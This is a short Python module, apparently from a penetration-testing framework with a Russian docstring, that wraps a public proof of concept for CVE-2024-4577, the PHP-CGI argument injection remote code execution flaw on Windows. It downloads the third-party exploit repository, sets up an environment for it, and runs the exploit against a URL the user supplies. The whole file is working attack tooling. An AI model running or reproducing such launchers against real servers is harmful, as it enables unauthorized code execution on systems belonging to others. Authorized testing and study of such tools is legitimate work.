"""CVE-2024-4577 — PHP-CGI argument injection (Windows).
Обёртка над Chocapikk/CVE-2024-4577.
Требования: git, python3, venv.
"""
from pathlib import Path

from framework import Module, C
from poc_support import ensure_repo, python_environment, run_checked

REPO = "https://github.com/Chocapikk/CVE-2024-4577.git"
WORK = Path.home() / ".rce-tool" / "cve-2024-4577"


class CVE20244577(Module):
    name = "cve_2024_4577"
    description = "PHP-CGI argument injection RCE (Windows, Chocapikk PoC)"
    author = "you"

    options = {
        "TARGET": {
            "value": None, "required": True, "kind": "url",
            "description": "Target URL, e.g. http://10.10.10.5",
        },
    }

    def run(self):
        ensure_repo(REPO, WORK, "exploit.py")
        python = python_environment(WORK)
        cmd = [python, "exploit.py", "--url", self.get("TARGET")]
        print(f"{C.Y}[*] Running PHP-CGI PoC{C.END}")
        run_checked(cmd, cwd=WORK)
